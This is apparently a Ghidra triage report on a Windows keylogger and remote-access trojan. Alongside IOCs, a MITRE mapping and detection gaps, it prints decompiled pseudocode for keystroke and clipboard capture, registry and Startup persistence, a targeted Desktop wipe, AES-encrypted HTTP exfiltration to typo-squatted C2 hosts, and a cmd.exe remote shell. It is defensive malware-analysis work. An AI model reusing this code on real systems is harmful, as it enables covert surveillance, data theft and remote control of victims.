# Ghidra Findings — Reverse Engineering Triage

## 1. Binary Metadata

- **Architecture**: Windows x86-64 PE
- **Compiler**: GCC (MinGW-w64) — strings show `GCC: (GNU) 9.3-win32 20200320` and `10-win32 20220113`
- **Entry point**: `0x1400014d0` (`entry` → `FUN_140001190` runtime init → `FUN_140003233` main logic)
- **TLS callbacks**: `tls_callback_0` (0x140003e30), `tls_callback_1` (0x140003e00)
- **Segments**:
  - `.text` 0x140001000–0x1400111ff
  - `.data` 0x140012000–0x1400121ff
  - `.rdata` 0x140013000–0x1400147ff
  - `.bss` 0x140017000–0x1400184df
  - `.idata` 0x140019000–0x14001a1ff
  - `.rsrc` 0x14001d000–0x14001e1ff
- **Imported DLLs**: ADVAPI32.dll, bcrypt.dll, KERNEL32.dll, msvcrt.dll, SHELL32.dll, USER32.dll, WININET.dll
- **Exports**: only standard `entry`, `tls_callback_0`, `tls_callback_1` (no DLL exports — this is an EXE)

## 2. Imports of Interest

| Category | Imports |
|---|---|
| Process / Cmd Execution | `CreateProcessA`, `CreatePipe`, `ReadFile`, `WaitForSingleObject`, `CreateThread` |
| Filesystem | `CopyFileA`, `CreateDirectoryA`, `DeleteFileA`, `RemoveDirectoryA`, `GetFileAttributesA`, `FindFirstFileA`, `FindNextFileA`, `GetModuleFileNameA`, `SHGetFolderPathA` |
| Registry / Persistence | `RegCreateKeyExA`, `RegSetValueExA`, `RegCloseKey` |
| Single-instance / Sync | `CreateMutexA`, `ReleaseMutex`, `WaitForSingleObject` |
| Networking (HTTP exfil/C2) | `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, `InternetCloseHandle` |
| Crypto | `BCryptOpenAlgorithmProvider`, `BCryptSetProperty`, `BCryptGenerateSymmetricKey`, `BCryptEncrypt`, `BCryptDecrypt`, `BCryptDestroyKey`, `BCryptCloseAlgorithmProvider` |
| Keylogging / Clipboard / Window | `GetAsyncKeyState`, `OpenClipboard`, `GetClipboardData`, `CloseClipboard`, `GlobalLock`, `GlobalUnlock`, `GetForegroundWindow`, `GetWindowTextA` |
| Recon | `GetUserNameA`, `GetComputerNameA`, `GetSystemInfo`, `GlobalMemoryStatusEx`, `GetSystemDefaultLCID` |
| Stealth | `FreeConsole`, `SetUnhandledExceptionFilter` |

## 3. Strings of Interest

| Address | String | Purpose |
|---|---|---|
| 0x140013000 | `Mozilla/5.0` | HTTP User-Agent |
| 0x14001300c | `MiccosoftUpdate.com` | C2 / exfil host #1 (typo-squat of "Microsoft") |
| 0x140013020 | `HTTP/1.1` | HTTP version |
| 0x140013030 | `Content-Type: application/octet-stream\r\n` | Outbound headers (encrypted blobs) |
| 0x140013059 | `windowsupdater.tk` | C2 / exfil host #2 (`.tk` Tokelau TLD) |
| 0x14001306b | `/api/data` | Exfil endpoint (keystrokes/clipboard/window titles) |
| 0x140013075 | `/update/servicedata` | Exfil endpoint for command output |
| 0x140013098 | `ChainingModeECB` | BCrypt AES-ECB mode |
| 0x1400130b8 | `ChainingMode` | BCrypt property name |
| 0x1400130d2 | `[CLIPBOARD] %s` | Clipboard event tag |
| 0x1400130eb | `%s\\%s` | Path join format |
| 0x140013100 | `Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n` | Initial recon report |
| 0x140013133 | `cmd.exe /c %s` | Command execution wrapper |
| 0x140013141 | `/windows/checkforupdate` | C2 polling endpoint (commands) |
| 0x140013159 | `Host: %s\r\n` | HTTP header build |
| 0x140013164 | `Content-Type: text/plain\r\n` | C2 poll header |
| 0x14001317f | `"command":"` | JSON tasking key |
| 0x14001318a | `%s\\Microsoft` | Persistence directory format |
| 0x140013197 | `%s\\Microsoft\\updater.exe` | Persistence binary path |
| 0x1400131b0 | `Software\\Microsoft\\Windows\\CurrentVersion\\Run` | Run-key persistence |
| 0x1400131de | `MicrosoftUpdater` | Run-key value name / scheduled-task tree key |
| 0x1400131f0 | `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater` | Fake scheduled-task registry artifact |
| 0x140013249 | `Index` | TaskCache value |
| 0x14001324f | `Global\\MicrosoftUpdateMutex` | Single-instance mutex |
| 0x14001326b / 0x140013271 | `Host:`, `Host: %255s` | Used to parse exfil host out of recon string |
| 0x14001327d | `/api/info` | First-beacon endpoint (host info) |
| 0x140013287 | `[WINDOW: %s]` | Foreground window-title marker |
| 0x140013298 | `ABCDEFGH...+/` | Base64 alphabet |

## 4. Capability Map (with decompiled evidence)

### 4.1 Anti-analysis / Locale & Sandbox guard — `FUN_14000318b` (0x14000318b)
**MITRE**: T1497 (Virtualization/Sandbox Evasion), T1480.001 (Execution Guardrails: Environmental Keying — locale)

```c
hMutex = CreateMutexA(0, 1, "Global\\MicrosoftUpdateMutex");
if (GetLastError() == 0xb7) { CloseHandle(hMutex); return 0; }   // already running
if ((short)GetSystemDefaultLCID() == 0x419) {                    // 0x419 = ru-RU
    ReleaseMutex(hMutex); CloseHandle(hMutex); return 0;          // exit on Russian locale
}
return 1;
```
Refuses to run on Russian-locale systems (LCID `0x0419`) and enforces single instance via mutex `Global\MicrosoftUpdateMutex`.

### 4.2 Anti-analysis / Analyst-machine wipe — `FUN_14000221a` (0x14000221a)
**MITRE**: T1070.004 (Indicator Removal: File Deletion)

```c
local_28 = 0x73726573555c3a43;  // "C:\\Users"
local_20 = 0x5c737265646e415c;  // "\\Anders\\"
local_18 = 0x706f746b736544;    // "Desktop"
byte key[6] = {3,1,0x0c,1,0x13,0x1d};
for (i = 0; i < 6; i++) buf[9+i] ^= key[i];   // mutates "Anders" → "Bohdan"
if (GetFileAttributesA(buf) != INVALID) FUN_1400020c7(buf);   // recursive delete
```
XOR-decodes path `C:\Users\Bohdan\Desktop`. If that folder exists it calls `FUN_1400020c7` (recursive `FindFirstFileA` / `DeleteFileA` / `RemoveDirectoryA`) — i.e. wipes the Desktop of a specific researcher/victim. `FUN_1400020c7` is a recursive directory destroyer:
```c
FindFirstFileA("%s\\*",...);
do { ... if (dir) FUN_1400020c7(child); RemoveDirectoryA(...); else DeleteFileA(...); } while(FindNextFileA);
```

### 4.3 Persistence — `FUN_140002e83` (0x140002e83)
**MITRE**: T1547.001 (Registry Run Key), T1546 (Event-triggered exec), T1564.001 (Hidden masquerading), T1036.005 (Masquerading: legitimate name)

```c
GetModuleFileNameA(0, self, 0x104);
SHGetFolderPathA(0, CSIDL_APPDATA /*0x1c*/, 0, 0, appdata);
sprintf(dir, "%s\\Microsoft", appdata);
sprintf(dst, "%s\\Microsoft\\updater.exe", appdata);
CreateDirectoryA(dir, NULL);
CopyFileA(self, dst, 0);                                  // %APPDATA%\Microsoft\updater.exe

if (SHGetFolderPathA(0, CSIDL_STARTUP /*7*/, ...) == 0) {  // also drop into Startup folder
    strcat(startup, "\\msteams_updater.exe");              // (assembled via builtin_strncpy chunks)
    CopyFileA(self, startup, 0);
}

RegCreateKeyExA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
RegSetValueExA(key, "MicrosoftUpdater", 0, REG_SZ, dst, ...);    // HKCU Run autorun

RegCreateKeyExA(HKLM, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater", ...);
RegSetValueExA(key, "SD",    0, REG_BINARY, zeros, 0x14);
RegSetValueExA(key, "Index", 0, REG_DWORD, &one, 4);             // fake scheduled-task tree entry
```
Three persistence vectors: copy to `%APPDATA%\Microsoft\updater.exe`, drop to user Startup folder as `msteams_updater.exe`, HKCU `Run\MicrosoftUpdater`, plus a *spoofed* TaskCache registry tree entry under HKLM (a fake scheduled-task artifact, no real task XML).

### 4.4 Recon / Initial Beacon — `FUN_1400022bb` (0x1400022bb) + caller `FUN_140003233`
**MITRE**: T1082 (System Information Discovery), T1033 (System Owner/User), T1016 (Network configuration), T1071.001 (Web protocols)

```c
GetComputerNameA(host, ...);
GetUserNameA(user, ...);
GetSystemInfo(&si);
GlobalMemoryStatusEx(&mem);
sprintf(buf, "Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n", host, user, arch, cpus, ram_mb);
```
In `FUN_140003233`, the result is **sent in cleartext** via `FUN_1400017b0("/api/info", buf, len)` to `MiccosoftUpdate.com:80`, then `Host:` is parsed back out of the same buffer with `sscanf("Host: %255s", ...)` and used as a tag for subsequent encrypted exfils.

### 4.5 Keylogger — main loop in `FUN_140003233` (0x140003233)
**MITRE**: T1056.001 (Input Capture: Keylogging), T1010 (Application Window Discovery)

```c
while (true) {
    FUN_140001eb5(window, 0x100);                      // GetForegroundWindow + GetWindowTextA
    if (strcmp(window, lastWindow)) {                   // window changed
        if (buflen) FUN_140001df3(1, keybuf, host);     // flush buffered keystrokes (type=1)
        sprintf(line, "[WINDOW: %s]", window);
        FUN_140001df3(1, line, host);                   // send window-change marker
        strcpy(lastWindow, window);
    }
    for (vk = 8; vk < 0x100; vk++) {
        if (GetAsyncKeyState(vk) & 1) {
            // translate vk → char (handles A-Z, 0-9, space, CR→\n, TAB, BACKSPACE, .,-)
            // shift-state via GetAsyncKeyState(VK_SHIFT)
            keybuf[buflen++] = ch;                      // capped at 900
        }
    }
    FUN_140001fe4(host);                                // clipboard poll (see 4.6)
    Sleep(100);
}
```

### 4.6 Clipboard monitor — `FUN_140001fe4` (0x140001fe4) → `FUN_140001f13` (0x140001f13)
**MITRE**: T1115 (Clipboard Data)

```c
n = FUN_140001f13(buf, 0x800);                            // OpenClipboard / GetClipboardData(CF_TEXT)
if (n > 0 && strcmp(buf, lastClipboard) != 0) {
    sprintf(out, "[CLIPBOARD] %s", buf);
    strcpy(lastClipboard, buf);
    FUN_140001df3(1, out, host);                          // exfil
}
```

### 4.7 AES-ECB Encrypt + Base64 — `FUN_140001b8c` (0x140001b8c) and `FUN_1400015dd` (0x1400015dd)
**MITRE**: T1573.001 (Symmetric Cryptography), T1132.001 (Standard Encoding)

```c
// FUN_140001b8c: AES-ECB encrypt with PKCS#7 padding
keylen = strlen(keystr); if (keylen > 16) keylen = 16;
memcpy(key, keystr, keylen);                              // remaining bytes zero-padded ⇒ 16-byte AES key
pad = 16 - plainlen % 16;                                 // PKCS#7
memcpy(buf, plaintext, plainlen); memset(buf+plainlen, pad, pad);
BCryptOpenAlgorithmProvider(&h, L"AES", 0, 0);
BCryptSetProperty(h, L"ChainingMode", L"ChainingModeECB", 0x20, 0);
BCryptGenerateSymmetricKey(h, &kh, 0, 0, key, 16, 0);
BCryptEncrypt(kh, buf, len, 0, 0, 0, out, len, &outlen, 0);
```
**Key derivation**: the AES-128 key is the first 16 bytes of the host string returned from the recon beacon (parsed via `Host: %255s`) — i.e. the operator-controlled hostname value echoed back.

`FUN_1400015dd` is a stock Base64 encoder (alphabet at `0x140013298`), used to wrap the ciphertext.

### 4.8 AES-ECB Decrypt — `FUN_140002884` (0x140002884)
**MITRE**: T1573.001
Same algorithm, used to decrypt commands fetched from `/windows/checkforupdate` (PKCS#7 unpadded at the end).

### 4.9 Exfil channel A — `FUN_1400017b0` (0x1400017b0) wrapped by `FUN_140001df3` (0x140001df3) / `FUN_140001a1c` (0x140001a1c)
**MITRE**: T1071.001 (Application Layer: Web), T1041 (Exfil over C2 Channel)

```c
// FUN_1400017b0
if (!hInternet) hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, 0,0,0);
hConn = InternetConnectA(hInternet, "MiccosoftUpdate.com", 80, 0,0, INTERNET_SERVICE_HTTP, 0,0);
hReq  = HttpOpenRequestA(hConn, "POST", verb, "HTTP/1.1", 0,0,0,0);
HttpSendRequestA(hReq, "Content-Type: application/octet-stream\r\n", -1, payload, len);
```
`FUN_140001df3(type, plaintext, hostkey)`:
1. Prepend a 1-byte `type` tag (1=key/window/clipboard, 3=cmd output via `FUN_140001e54`).
2. AES-ECB-encrypt with key = first 16 chars of `hostkey`.
3. Base64-encode.
4. POST to `http://MiccosoftUpdate.com/api/data`.

### 4.10 Exfil channel B — `FUN_1400018e7` (0x1400018e7) wrapped by `FUN_140001ad4` / `FUN_140001e54`
Identical to 4.9 but targets `http://windowsupdater.tk:80/update/servicedata` and is used for **command-execution output** (type byte = 3).

### 4.11 Remote command execution — `FUN_1400023e9` (0x1400023e9)
**MITRE**: T1059.003 (Windows Command Shell), T1071.001

```c
CreatePipe(&hRead, &hWrite, &sa, 0);                      // inheritable pipe
sprintf(cmdline, "cmd.exe /c %s", cmd);
si.hStdOutput = si.hStdError = hWrite;
CreateProcessA(NULL, cmdline, ..., CREATE_NO_WINDOW /*0x8000000*/, ..., &si, &pi);
CloseHandle(hWrite);
while (ReadFile(hRead, out+len, 0xfff-len, &n, 0) && n) len += n;
if (len == 0) { strcpy(out, "(no output)\n"); len = 12; }
FUN_140001e54(3, out, host);                              // encrypt + base64 + POST /update/servicedata
```

### 4.12 C2 polling thread — `LAB_140002a28` (referenced from `FUN_140003233` at 0x140003787)
The function spanning **0x140002a28–0x140002e82** is **not auto-disassembled by Ghidra** but xrefs prove its behavior:
- References `/windows/checkforupdate` at `0x140002b34` (data load of the URL string)
- References `"command":"` at `0x140002c18` (JSON parsing for tasking)
- Calls `FUN_1400023e9` (`cmd.exe /c …` runner) at `0x140002e31`

This is the C2 receiver thread launched via `CreateThread((LPTHREAD_START_ROUTINE)&LAB_140002a28, host, ...)` at `0x14000379b`. It periodically `HttpOpenRequestA`+`InternetReadFile` against `MiccosoftUpdate.com/windows/checkforupdate`, parses the JSON `"command":"<base64-aes-ciphertext>"`, AES-ECB-decrypts (`FUN_140002884`), then invokes `FUN_1400023e9` to run the command and ship the output. **Disassembly was not produced by Ghidra in this region — confirm in dynamic analysis.**

## 5. Hard-coded IOC Table

| Type | Value | Source (addr / func) | Use |
|---|---|---|---|
| Domain (C2 in) | `MiccosoftUpdate.com` | 0x14001300c — `FUN_1400017b0` | Recon beacon + keylog/clipboard/window exfil + command polling |
| Domain (C2 out) | `windowsupdater.tk` | 0x140013059 — `FUN_1400018e7` | Command-output exfil |
| URL path | `/api/info` | 0x14001327d — `FUN_140003233` | First beacon (cleartext system info) |
| URL path | `/api/data` | 0x14001306b — `FUN_140001a1c` | Encrypted keystrokes/clipboard/windows |
| URL path | `/windows/checkforupdate` | 0x140013141 — C2 thread | Command polling |
| URL path | `/update/servicedata` | 0x140013075 — `FUN_140001ad4` | Encrypted command output |
| TCP port | 80 | hardcoded `0x50` in `InternetConnectA` calls | HTTP |
| User-Agent | `Mozilla/5.0` | 0x140013000 | All HTTP traffic |
| Mutex | `Global\MicrosoftUpdateMutex` | 0x14001324f — `FUN_14000318b` | Single-instance |
| File path | `%APPDATA%\Microsoft\updater.exe` | 0x140013197 — `FUN_140002e83` | Dropped persistence binary |
| File path | `<Startup>\msteams_updater.exe` | assembled in `FUN_140002e83` (`builtin_strncpy`/`0x2e72657461647075`) | Startup-folder persistence |
| Registry key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` value `MicrosoftUpdater` | 0x1400131b0 / 0x1400131de | Run-key autorun |
| Registry key | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` (values `SD`, `Index`) | 0x1400131f0 / 0x140013249 | Spoofed scheduled-task tree |
| Path target (analyst trigger) | `C:\Users\Bohdan\Desktop` | XOR-decoded in `FUN_14000221a` | If present, Desktop is recursively wiped |
| Locale guard | LCID `0x0419` (ru-RU) | 0x14000318b | Refuses to run |
| Crypto | AES-128-ECB, PKCS#7 | `FUN_140001b8c`, `FUN_140002884` | Comms encryption |
| Key | First 16 bytes of host string echoed back from `/api/info` (parsed via `Host: %255s`) | `FUN_140003233` 0x1400036f9 | AES-128 key |
| Encoding | Standard Base64 alphabet `A-Za-z0-9+/`, `=` padding | 0x140013298 / `FUN_1400015dd` / `FUN_1400026bf` | Wrapping AES output / parsing input |
| Cmd template | `cmd.exe /c %s` | 0x140013133 — `FUN_1400023e9` | Shell exec |
| JSON key | `"command":"` | 0x14001317f | C2 tasking field |

## 6. Suspected Attack Flow

1. **Startup guard** (`FUN_14000318b`): create mutex `Global\MicrosoftUpdateMutex`; abort if already present or if system locale is Russian (`LCID 0x419`).
2. **Persistence** (`FUN_140002e83`): copy self to `%APPDATA%\Microsoft\updater.exe` and `<Startup>\msteams_updater.exe`; set HKCU `Run\MicrosoftUpdater`; create spoofed HKLM TaskCache `MicrosoftUpdater` tree.
3. **Researcher-trap wipe** (`FUN_14000221a` → `FUN_1400020c7`): if `C:\Users\Bohdan\Desktop` exists, recursively delete its contents.
4. **Stealth**: `FreeConsole()` to hide window.
5. **Initial beacon** (`FUN_1400022bb` + `FUN_1400017b0`): collect Computer/User/Arch/CPUs/RAM and POST cleartext to `http://MiccosoftUpdate.com/api/info`. Parse `Host:` value out of the same buffer to use as **AES-128 key seed**.
6. **C2 thread** (`LAB_140002a28`): periodically GET `http://MiccosoftUpdate.com/windows/checkforupdate`, parse JSON `"command":"<b64>"`, base64-decode, AES-ECB-decrypt with the host-derived key, run via `cmd.exe /c <cmd>` (`FUN_1400023e9`), capture stdout/stderr through a pipe, AES-encrypt+base64, POST to `http://windowsupdater.tk/update/servicedata`.
7. **Keylogger / Window / Clipboard** (main loop in `FUN_140003233`):
   - Track foreground-window title changes (`[WINDOW: %s]`).
   - Poll `GetAsyncKeyState` 0x08–0xFF every 100 ms; buffer up to 900 chars.
   - Poll clipboard via `OpenClipboard`/`GetClipboardData(CF_TEXT)` and emit `[CLIPBOARD] %s` when changed.
   - Each event: prepend type byte (1), AES-ECB-encrypt, base64, POST to `http://MiccosoftUpdate.com/api/data`.

## 7. MITRE ATT&CK Summary

| Tactic | Technique | Evidence |
|---|---|---|
| Execution | T1059.003 Windows Command Shell | `cmd.exe /c %s` in `FUN_1400023e9` |
| Persistence | T1547.001 Registry Run Key | `HKCU\…\Run\MicrosoftUpdater` in `FUN_140002e83` |
| Persistence | T1547.001 Startup Folder | `<Startup>\msteams_updater.exe` |
| Persistence | T1112 Modify Registry | Spoofed TaskCache tree |
| Defense Evasion | T1036.005 Masquerading | "MicrosoftUpdater", "msteams_updater.exe", `MiccosoftUpdate.com` |
| Defense Evasion | T1497 / T1480.001 Locale guardrail | `GetSystemDefaultLCID == 0x419` abort |
| Defense Evasion | T1564.003 Hidden Window | `FreeConsole`, `CREATE_NO_WINDOW` |
| Defense Evasion | T1070.004 Indicator Removal | Recursive directory wipe `FUN_1400020c7` |
| Discovery | T1082 System Information | `GetComputerNameA`, `GetSystemInfo`, `GlobalMemoryStatusEx` |
| Discovery | T1033 Owner/User | `GetUserNameA` |
| Discovery | T1010 Application Window | `GetForegroundWindow`/`GetWindowTextA` |
| Collection | T1056.001 Keylogging | `GetAsyncKeyState` polling |
| Collection | T1115 Clipboard Data | `OpenClipboard`/`GetClipboardData` |
| Command and Control | T1071.001 Web Protocols | WinINet POST/GET on port 80 |
| Command and Control | T1573.001 Symmetric Cryptography | AES-128-ECB via BCrypt |
| Command and Control | T1132.001 Standard Encoding | Base64 wrap |
| Exfiltration | T1041 Exfil over C2 | Same WinINet channels |

## 8. Gaps — needs Elasticsearch / dynamic telemetry to confirm

- **C2 thread body (0x140002a28–0x140002e82)** is not auto-disassembled by Ghidra; `/windows/checkforupdate` polling cadence, exact JSON shape, and any retry/sleep interval should be confirmed by network traffic capture and Sysmon Event ID 3 / proxy logs.
- **Real C2 IPs** behind `MiccosoftUpdate.com` and `windowsupdater.tk` — DNS resolution events (Sysmon EID 22 / Zeek `dns.log`) needed.
- **Command repertoire** received from operator — only telemetry of `cmd.exe /c` child processes of `updater.exe` (Sysmon EID 1 with `ParentImage` ending in `updater.exe` or `msteams_updater.exe`) will reveal it.
- **Whether the analyst-trap wipe ever fires** in production — file-deletion bursts under `C:\Users\Bohdan\Desktop` (EID 23/26).
- **Persistence success** — registry-set events for HKCU Run `MicrosoftUpdater` and HKLM TaskCache `MicrosoftUpdater` (EID 12/13).
- **Mutex collisions** — process-create with named mutex `Global\MicrosoftUpdateMutex` (EID 1 + ImageLoad correlation, or EDR mutex telemetry).
- **Initial beacon** — cleartext HTTP POST to `MiccosoftUpdate.com/api/info` is the cleanest detection (proxy/Zeek `http.log`, URI = `/api/info`, UA = `Mozilla/5.0` exactly, body containing literal `Host: ` + `User: ` + `Arch: `).
- **Key material** — confirm the operator's chosen "Host" string (= AES-128 key) by recovering the response body of `/api/info`.
